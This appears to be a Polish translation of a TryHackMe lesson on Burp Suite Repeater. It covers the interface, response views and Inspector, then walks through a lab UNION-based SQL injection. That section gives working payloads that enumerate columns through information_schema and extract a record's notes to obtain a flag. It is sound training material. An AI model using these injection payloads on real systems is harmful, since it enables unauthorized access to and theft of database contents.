---

Zanim zaczniemy używać Burp Suite Repeater, zapoznajmy się z jego przeznaczeniem i funkcjonalnością.

W istocie, Burp Suite Repeater umożliwia nam modyfikację i ponowne wysyłanie przechwyconych żądań do wybranego celu. Pozwala nam on odbierać żądania przechwycone przez serwer proxy Burp i manipulować nimi, wysyłając je wielokrotnie w razie potrzeby. Alternatywnie, możemy ręcznie tworzyć żądania od podstaw, podobnie jak za pomocą narzędzia wiersza poleceń, takiego jak cURL.

Możliwość wielokrotnego edytowania i ponownego wysyłania żądań sprawia, że ​​Repeater jest nieoceniony w przypadku ręcznej eksploracji i testowania punktów końcowych. Zapewnia przyjazny dla użytkownika interfejs graficzny do tworzenia ładunków żądań i oferuje różne widoki odpowiedzi, w tym silnik renderujący do graficznej reprezentacji.

Interfejs Repeater składa się z sześciu głównych sekcji, jak pokazano na poniższym diagramie:

![Pokazywanie przykładowego żądania w repetytorze Burp Suite](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/3a4a4ee2008a2ed6a1aa8e9af3601ab2.png)

1. **Lista żądań** : Znajduje się w lewym górnym rogu zakładki i wyświetla listę żądań Repeatera. Można zarządzać wieloma żądaniami jednocześnie, a każde nowe żądanie wysłane do Repeatera pojawi się tutaj.
    
2. **Kontrole żądań** : Znajdują się bezpośrednio pod listą żądań. Umożliwiają wysłanie żądania, anulowanie zawieszonego żądania i przeglądanie historii żądań.
    
3. **Widok Żądania i Odpowiedzi** : Ta sekcja, zajmująca większość interfejsu, wyświetla widoki **Żądania** i **Odpowiedzi** . Możemy edytować żądanie w widoku Żądania, a następnie je przesłać, podczas gdy odpowiadająca mu odpowiedź zostanie wyświetlona w widoku Odpowiedzi.
    
4. **Opcje układu** : Znajdujące się w prawym górnym rogu widoku Żądanie/Odpowiedź, opcje te umożliwiają dostosowanie układu widoków Żądanie i Odpowiedź. Domyślnym ustawieniem jest układ obok siebie (poziomy), ale możemy również wybrać układ pionowy lub połączyć je w osobnych kartach.
    
5. **Inspektor** : Umieszczony po prawej stronie, Inspektor pozwala nam analizować i modyfikować żądania w sposób bardziej intuicyjny niż za pomocą edytora plików RAW. Omówimy tę funkcję w kolejnym zadaniu.
    
6. **Cel** : Pole „Cel”, znajdujące się nad Inspektorem, określa adres IP lub domenę, do której wysyłane są żądania. Gdy żądania są wysyłane do Repeatera z innych komponentów Burp Suite , to pole jest wypełniane automatycznie.
Wiemy już, jak wygląda interfejs aplikacji, ale w jaki sposób możemy go efektywnie wykorzystać?

Chociaż ręczne tworzenie żądań jest opcją, częściej przechwytuje się żądanie za pomocą modułu Proxy , a następnie przesyła do Repeatera w celu dalszej edycji i ponownego wysłania.

Po przechwyceniu żądania w module Proxy możemy wysłać je do Repeatera, klikając prawym przyciskiem myszy na żądaniu i wybierając opcję **Wyślij do Repeatera** lub korzystając ze skrótu klawiaturowego `Ctrl + R`.

Wracając do Repeatera, możemy zauważyć, że przechwycone żądanie jest teraz dostępne w widoku Żądanie:

![Żądanie w widoku żądania](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d9e176315f8850e719252ed/room-content/ae762b56b7ecb30a0d861221d41502f5.png)

Zarówno sekcja Cel, jak i Inspektor wyświetlają teraz istotne informacje, chociaż obecnie brakuje odpowiedzi. Po kliknięciu przycisku **Wyślij** widok Odpowiedź szybko się wypełnia:

![Widok odpowiedzi szybko się wypełnia](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d9e176315f8850e719252ed/room-content/11da62185a73223355048c2fc04a1340.png)

Jeśli chcemy zmodyfikować dowolny aspekt żądania, wystarczy wpisać tekst w widoku Żądanie i ponownie nacisnąć **Wyślij . Spowoduje to odpowiednią aktualizację widoku Odpowiedź po prawej stronie. Na przykład, zmiana nagłówka** **połączenia** na „open” zamiast „close” spowoduje wygenerowanie odpowiedzi z nagłówkiem **połączenia** zawierającym wartość „keep-alive”:

![nagłówek zawierający wartość keep-alive](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d9e176315f8850e719252ed/room-content/67d1462106edc86bd676315b3c0cba08.png)

Co więcej, możemy wykorzystać przyciski historii znajdujące się po prawej stronie przycisku Wyślij, aby poruszać się po historii modyfikacji i w razie potrzeby przechodzić do kolejnych zmian.

Repeater udostępnia nam różne opcje prezentacji żądań i odpowiedzi, od wyników szesnastkowych po w pełni wyrenderowaną stronę.

Aby zapoznać się z tymi opcjami, możemy zapoznać się z sekcją znajdującą się nad polem odpowiedzi, gdzie dostępne są cztery następujące przyciski widoku:

![Cztery przyciski nad polem odpowiedzi](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d9e176315f8850e719252ed/room-content/635ad62b0204b104bbd58489716eccde.png)

Mamy do wyboru następujące opcje wyświetlania:

1. **Ładny** : To jest opcja domyślna, która przyjmuje surową odpowiedź i stosuje niewielkie zmiany formatowania w celu zwiększenia czytelności.
    
2. **Surowy** : Ta opcja wyświetla niezmodyfikowaną odpowiedź otrzymaną bezpośrednio z serwera, bez żadnego dodatkowego formatowania.
    
3. **Hex** : Wybierając ten widok, możemy analizować odpowiedź w postaci bajtów, co jest szczególnie przydatne w przypadku plików binarnych.
    
4. **Renderowanie** : Opcja renderowania pozwala nam wizualizować stronę tak, jak wyglądałaby w przeglądarce internetowej. Chociaż nie jest ona powszechnie wykorzystywana w Repeaterze, ponieważ zazwyczaj skupiamy się na kodzie źródłowym, nadal oferuje cenną funkcję. W większości scenariuszy opcja **„Pretty”** jest zazwyczaj wystarczająca. Warto jednak zapoznać się z działaniem pozostałych trzech opcji.

Obok przycisków widoku, po prawej stronie, znajduje się przycisk „Pokaż znaki **niedrukowalne**`\n` ” ( ). Ta funkcjonalność umożliwia wyświetlanie znaków, które mogą być niewidoczne w przypadku opcji **„Pretty”** lub **„Raw”** . Na przykład, każdy wiersz odpowiedzi zazwyczaj kończy się znakami `\r\n`, reprezentującymi powrót karetki, po którym następuje nowy wiersz. Znaki te odgrywają ważną rolę w interpretacji nagłówków HTTP .

Choć nie jest to obowiązkowe w przypadku większości zadań, w pewnych sytuacjach opcja ta może okazać się korzystna.

Inspektor to funkcja uzupełniająca widoki Żądania i Odpowiedzi w module Repeater. Służy również do wizualnego uporządkowania zestawień żądań i odpowiedzi, a także do eksperymentowania, aby sprawdzić, jak zmiany wprowadzone za pomocą Inspektora wyższego poziomu wpływają na równoważne wersje surowe.

Inspektora można używać zarówno w module Proxy , jak i Repeater. W obu przypadkach znajduje się on po prawej stronie okna, prezentując listę komponentów w żądaniu i odpowiedzi:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/6c95db764fe7491d938485256fd1dd87.png)  

Wśród tych komponentów, sekcje dotyczące żądania zazwyczaj można modyfikować, umożliwiając dodawanie, edycję i usuwanie elementów. Na przykład, w sekcji **„Atrybuty żądania** ” możemy modyfikować elementy związane z lokalizacją, metodą i protokołem żądania. Obejmuje to modyfikację żądanego zasobu do pobrania, zmianę metody HTTP z GET na inną odmianę lub zmianę protokołu z HTTP /1 na HTTP /2:

![Zmiana protokołu z HTTP/1 na HTTP/2](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d9e176315f8850e719252ed/room-content/4f3a0f3714ceebbd6016e077369b48e8.png)

Inne sekcje dostępne do przeglądania i/lub edycji obejmują:

1. **Parametry zapytania żądania:** Odnoszą się do danych wysyłanych do serwera za pośrednictwem adresu URL. Na przykład w żądaniu GET, takim jak [brakuje wartości] `https://admin.tryhackme.com/?redirect=false`, parametr zapytania **redirect** ma wartość „false”.
2. **Parametry treści żądania:** Podobne do parametrów zapytania, ale specyficzne dla żądań POST. Wszelkie dane wysłane w ramach żądania POST będą wyświetlane w tej sekcji, co pozwala nam modyfikować parametry przed ponownym wysłaniem.
3. **Żądanie plików cookie:** Ta sekcja zawiera modyfikowalną listę plików cookie wysyłanych wraz z każdym żądaniem.
4. **Nagłówki żądań:** Umożliwiają nam przeglądanie, dostęp i modyfikację (w tym dodawanie lub usuwanie) wszelkich nagłówków wysyłanych wraz z naszymi żądaniami. Edycja tych nagłówków może być przydatna podczas badania reakcji serwera WWW na nieoczekiwane nagłówki.
5. **Nagłówki odpowiedzi:** Ta sekcja wyświetla nagłówki zwrócone przez serwer w odpowiedzi na nasze żądanie. Nie można jej modyfikować, ponieważ nie mamy kontroli nad nagłówkami zwróconymi przez serwer. Należy pamiętać, że ta sekcja staje się widoczna dopiero po wysłaniu żądania i otrzymaniu odpowiedzi.

Chociaż tekstową reprezentację tych komponentów można znaleźć w widokach Żądanie i Odpowiedź, tabelaryczny format Inspectora zapewnia wygodny sposób ich wizualizacji i interakcji z nimi. Eksperymentowanie z dodawaniem, usuwaniem i edytowaniem nagłówków w Inspectorze pomaga zrozumieć, jak odpowiadająca im wersja surowa zmienia się w odpowiedzi.

Repeater jest szczególnie przydatny w przypadku zadań wymagających powtarzalnego wysyłania podobnych żądań, zazwyczaj z drobnymi modyfikacjami. Jest to szczególnie przydatne w takich czynnościach, jak ręczne testowanie podatności na ataki typu SQL Injection (które zostaną omówione w kolejnym zadaniu), próby ominięcia filtrów zapory sieciowej aplikacji internetowej lub dostosowywanie parametrów w przesłanym formularzu.

Zacznijmy od bardzo prostego przykładu: wykorzystanie Repeatera do modyfikacji nagłówków żądania wysyłanego do celu.

Przechwyć żądanie `http://MACHINE_IP/`w module Proxy i wyślij je do Repeatera.

Wyślij żądanie raz z Repeatera  —  w widoku Odpowiedź powinien pojawić się kod źródłowy HTML żądanej strony.

Spróbuj obejrzeć to w jednej z innych opcji wyświetlania (np. Hex).  

Używając Inspektora (lub ręcznie, jeśli wolisz), dodaj nagłówek o nazwie `FlagAuthorised`i ustaw mu wartość `True`, jak pokazano poniżej:

Dodano nagłówek z flagą autoryzacji

GET / HTTP /1.1
Host: MACHINE_IP 
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Akceptuj: text/html,application/xhtml+ xml ,application/ xml ;q=0.9,image/webp,*/*;q=0.8
Akceptuj język: en-US,en;q=0.5
Akceptacja kodowania: gzip, deflate
Połączenie: zamknięte
Żądania aktualizacji niezabezpieczone: 1
FlagAuthorised: TRUE

#### Wyzwanie na dodatkową milę

To zadanie ma na celu sprawdzenie Twoich umiejętności w nieco bardziej wymagającym, realistycznym scenariuszu z wykorzystaniem Burp Repeater. Jeśli posiadasz doświadczenie pozwalające na samodzielne wykonanie ręcznego ataku SQL Injection, możesz pominąć ostatnie pytanie i podjąć się tego zadania w ramach wyzwania „w ciemno”. Poniżej znajdziesz jednak szczegółowy opis, jeśli potrzebujesz wskazówek.

#### Wymagana wiedza

Przed rozpoczęciem tego wyzwania zaleca się zapoznanie się z zasadami ataków SQL Injection. Jeśli jeszcze tego nie zrobiłeś/aś, rozważ zapoznanie się z salą [SQL Injection](https://tryhackme.com/jr/sqlinjectionlm) poświęconą temu tematowi. Chociaż otrzymasz kompleksowy przewodnik krok po kroku, podstawowa znajomość zasad ataków SQL Injection okaże się pomocna w wykonaniu tego zadania.

#### Cel wyzwania

Celem tego wyzwania jest zidentyfikowanie i wykorzystanie luki w zabezpieczeniach Union SQL Injection, obecnej w parametrze ID punktu `/about/ID`końcowego. Wykorzystując tę ​​lukę, Twoim zadaniem jest przeprowadzenie ataku w celu pobrania notatek o prezesie firmy zapisanych w bazie danych.

#### Przewodnik

Wiemy, że istnieje luka i wiemy, gdzie się znajduje. Teraz musimy ją tylko wykorzystać!

Zacznijmy od przechwycenia żądania `http://10.80.163.207/about/2`w serwerze proxy Burp. Po przechwyceniu żądania wyślij je do Repeatera za pomocą `Ctrl + R`lub klikając prawym przyciskiem myszy i wybierając „Wyślij do Repeatera”.

Skoro już przygotowaliśmy nasze żądanie, sprawdźmy, czy istnieje luka w zabezpieczeniach. Dodanie pojedynczego apostrofu ( `'`) zazwyczaj wystarczy, aby serwer zgłosił błąd w obecności prostego zapytania SQLi. Dlatego, używając Inspectora lub ręcznie edytując ścieżkę żądania, dodaj apostrof po cyfrze „2” na końcu ścieżki i wyślij żądanie:  

Żądaj nagłówków z naszej przeglądarki

```html

```

Powinieneś zobaczyć, że serwer odpowiada komunikatem „500 Internal Server Error” (wewnętrzny błąd serwera 500), co oznacza, że ​​zapytanie zostało pomyślnie przerwane:  

Nagłówki odpowiedzi z serwera

```html
HTTP/1.1 500 INTERNAL SERVER ERROR<
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 16 Aug 2021 23:05:21 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3101

```

Jeśli przejrzymy treść odpowiedzi serwera, zobaczymy coś bardzo interesującego w okolicach linii 40. Serwer podaje nam zapytanie, które próbowaliśmy wykonać:  

Zbyt rozbudowany komunikat o błędzie pokazujący zapytanie

```html
<h2>
    <code>Invalid statement: 
        <code>SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'</code>
    </code>
</h2>
```

To niezwykle przydatny komunikat o błędzie, którego serwer absolutnie nie powinien nam wysyłać, _ale_ sam fakt, że go otrzymujemy, znacznie ułatwia nam zadanie.

Wiadomość mówi nam kilka rzeczy, które będą nieocenione przy wykorzystywaniu tej luki:

- Tabela bazy danych, z której dokonujemy wyboru, nazywa się `people`.
- Zapytanie wybiera pięć kolumn z tabeli: `firstName`, `lastName`, `pfpLink`, `role`i `bio`. Możemy odgadnąć, gdzie znajdują się one na stronie, co będzie pomocne przy wyborze miejsca, w którym umieścimy nasze zapytania.

Dzięki tym informacjom możemy pominąć kroki dotyczące numerów kolumn zapytania i wyliczania nazw tabel.

Mimo że udało nam się usunąć sporą część wymaganych tutaj wyliczeń, nadal musimy znaleźć nazwę naszej kolumny docelowej.

Ponieważ znamy nazwę tabeli i liczbę wierszy, możemy użyć zapytania sumarycznego, aby wybrać nazwy kolumn dla `people`tabeli z `columns`tabeli w `information_schema`domyślnej bazie danych.

Proste zapytanie w tym celu wygląda następująco:  
`/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"`  

Tworzy to zapytanie sumujące i wybiera nasz obiekt docelowy, a następnie cztery kolumny null (aby uniknąć błędów zapytania). Zauważ, że zmieniliśmy również identyfikator, z którego dokonujemy wyboru, `2`na `0`. Ustawiając identyfikator na nieprawidłową liczbę, gwarantujemy, że nie zwrócimy niczego z oryginalnego (prawidłowego) zapytania; oznacza to, że pierwszy wiersz zwrócony z bazy danych będzie naszą pożądaną odpowiedzią na wstrzyknięte zapytanie.

Przeglądając zwróconą odpowiedź, możemy zauważyć, że nazwa pierwszej kolumny ( `id`) została wstawiona do tytułu strony:  

Nazwa kolumny „id” w tytule odpowiedzi

```html
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 16 Aug 2021 22:12:36 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Front-End-Https: on
Content-Length: 3360

<!DOCTYPE html>
<html lang=en>
    <head>
        <title>
            About | id None
        </title>
-----
```

Udało nam się pobrać pierwszą nazwę kolumny z bazy danych, ale teraz mamy problem. Strona wyświetla tylko pierwszy pasujący element  —  potrzebujemy zobaczyć wszystkie pasujące elementy.

Na szczęście możemy użyć naszego SQLi do grupowania wyników. Nadal możemy pobrać tylko jeden wynik na raz, ale używając tej `group_concat()` funkcji, możemy połączyć wszystkie nazwy kolumn w jeden wynik:  
`/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"`  

Proces ten pokazano poniżej:

![nazwy tabel w tytule](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/78495a1c1c84ce8d80cba18c48d924eb.png)

Pomyślnie zidentyfikowaliśmy osiem kolumn w tej tabeli: `id`, `firstName`, `lastName`, `pfpLink`, `role`, `shortRole`, `bio`, i `notes`.

Biorąc pod uwagę nasze zadanie, można śmiało założyć, że naszą kolumną docelową jest `notes`.

Na koniec jesteśmy gotowi pobrać flagę z tej bazy danych — mamy już wszystkie potrzebne informacje:

- Nazwa tabeli: `people`.
- Nazwa kolumny docelowej: `notes`.
- Identyfikator dyrektora generalnego to `1`; można go znaleźć, klikając na profil Jamesona Wolfe'a na `/about/`stronie i sprawdzając identyfikator w adresie URL.

Utwórzmy zapytanie, aby wyodrębnić tę flagę:  
`0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1   `

No i proszę, mamy flagę!

![flaga z bazy danych](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/c036d3282f1ec33472c0042f5d9a9f36.png)

#BURP #SUITE #UNION #SELECT #SQL #INJECTION
